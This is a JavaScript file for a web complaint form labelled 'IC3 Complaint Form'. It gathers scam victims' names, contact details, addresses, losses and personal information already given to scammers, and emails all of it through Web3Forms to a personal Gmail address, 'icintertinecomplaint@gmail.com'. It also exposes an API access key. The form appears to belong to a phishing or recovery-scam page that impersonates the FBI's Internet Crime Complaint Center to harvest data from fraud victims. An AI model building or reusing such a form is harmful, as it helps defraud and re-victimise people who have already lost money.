/* ======================================================= */
/* Web3Forms AJAX — https://web3forms.com                  */
/* Toast notification system                               */
/* ======================================================= */

/* ---------------------------------------------------------
   Web3Forms access key is set in index.html:
   Key: defbd3b5-d292-4e6d-9be4-9d84b92b9674
   Delivers to: icintertinecomplaint@gmail.com
   --------------------------------------------------------- */

var WEB3FORMS_ENDPOINT = "https://api.web3forms.com/submit";
var ADMIN_EMAIL        = "icintertinecomplaint@gmail.com";


/* ======================================================= */
/* TOAST NOTIFICATION SYSTEM                               */
/* ======================================================= */

function showToast(message, type) {
  type = type || "success";

  var container = document.getElementById("toast-container");
  if (!container) {
    container = document.createElement("div");
    container.id = "toast-container";
    document.body.appendChild(container);
  }

  var toast = document.createElement("div");
  toast.className = "toast toast-" + type;

  var icon = type === "error" ? "\u2717" : type === "info" ? "\u2139" : "\u2713";

  toast.innerHTML =
    '<div class="toast-content">' +
      '<span class="toast-icon">' + icon + '</span>' +
      '<span class="toast-message">' + message + '</span>' +
    '</div>' +
    '<div class="toast-progress"></div>';

  container.appendChild(toast);

  setTimeout(function () { toast.classList.add("show"); }, 10);

  setTimeout(function () {
    toast.classList.add("toast-fade-out");
    toast.classList.remove("show");
    toast.addEventListener("transitionend", function () {
      if (toast.parentNode) toast.remove();
    }, { once: true });
  }, 5000);
}


/* ======================================================= */
/* FORM SUBMISSION HANDLER                                 */
/* ======================================================= */

document.addEventListener("DOMContentLoaded", function () {

  var form  = document.getElementById("complaintForm");
  var msgEl = document.getElementById("successMessage");

  if (!form)  { console.error("complaintForm not found");  return; }
  if (!msgEl) { console.error("successMessage not found"); return; }

  form.addEventListener("submit", async function (e) {
    e.preventDefault();
    e.stopPropagation();

    var submitBtn = form.querySelector('[type="submit"]');
    if (submitBtn) submitBtn.disabled = true;

    msgEl.style.color = "orange";
    msgEl.innerText   = "Submitting, please wait\u2026";
    showToast("Submitting your complaint, please wait\u2026", "info");

    /* --- Collect all form values (including hidden Web3Forms fields) --- */
    var fd = new FormData(form);

    /* Capture the "affected" radio button (not auto-captured by FormData radio groups) */
    var affectedEl = form.querySelector('[name="affected"]:checked');
    if (affectedEl) {
      fd.set("affected", affectedEl.value);
    } else {
      fd.set("affected", "Not specified");
    }

    /* Convert FormData to plain JSON object */
    var payload = {};
    fd.forEach(function (value, key) {
      /* Skip file inputs — Web3Forms free tier doesn't handle attachments */
      if (value instanceof File) return;
      payload[key] = value;
    });

    /* Build a readable email body from all the fields */
    payload.message = buildEmailBody(payload);

    /* Ensure the from_name field is set */
    payload.from_name = payload.fullname || "IC3 Complaint Form";

    try {

      var response = await fetch(WEB3FORMS_ENDPOINT, {
        method:  "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept":        "application/json"
        },
        body: JSON.stringify(payload)
      });

      var result = await response.json();

      if (response.ok && result.success) {
        /* ---- SUCCESS ---- */
        msgEl.style.color = "green";
        msgEl.innerText   = "Complaint submitted successfully! You will receive a confirmation shortly.";
        showToast("Complaint submitted successfully!", "success");
        form.reset();

      } else {
        /* ---- API-LEVEL FAILURE ---- */
        var errMsg = result.message || "Submission failed. Please check your access key.";
        msgEl.style.color = "red";
        msgEl.innerText   = errMsg;
        showToast(errMsg, "error");
        console.error("Web3Forms error:", result);
      }

    } catch (error) {

      /* ---- NETWORK FAILURE ---- */
      var netMsg = "Network error — please check your internet connection and try again.";
      console.error("Submission error:", error);
      msgEl.style.color = "red";
      msgEl.innerText   = netMsg;
      showToast(netMsg, "error");

    } finally {
      if (submitBtn) submitBtn.disabled = false;
    }

  });

});


/* ======================================================= */
/* BUILD READABLE EMAIL BODY                               */
/* ======================================================= */

function buildEmailBody(d) {
  var lines = [
    "=== PERSONAL INFORMATION ===",
    "Full Name:          " + (d.fullname       || "-"),
    "Email:              " + (d.email          || "-"),
    "Phone:              " + (d.phone          || "-"),
    "Business Name:      " + (d.businessName   || "-"),
    "Gender:             " + (d.gender         || "-"),
    "Affected (Y/N):     " + (d.affected       || "-"),
    "",
    "=== LOCATION ===",
    "Country:            " + (d.country        || "-"),
    "State:              " + (d.state          || "-"),
    "City:               " + (d.city           || "-"),
    "Address:            " + (d.address        || "-"),
    "Zip Code:           " + (d.zipcode        || "-"),
    "",
    "=== COMPLAINT DETAILS ===",
    "Category:           " + (d.category       || "-"),
    "How scammed:        " + (d.scammethod     || "-"),
    "Times scammed:      " + (d.timesscammed   || "-"),
    "Payments sent:      " + (d.timespaid      || "-"),
    "Total loss amount:  " + (d.lossamount     || "-"),
    "Scammer handle:     " + (d.scammerhandle  || "-"),
    "Date payment made:  " + (d.datepaymentmade|| "-"),
    "",
    "=== ADDITIONAL INFORMATION ===",
    "Personal info sent to scammer:",
    (d.personalinfosent || "-"),
  ];

  return lines.join("\n");
}
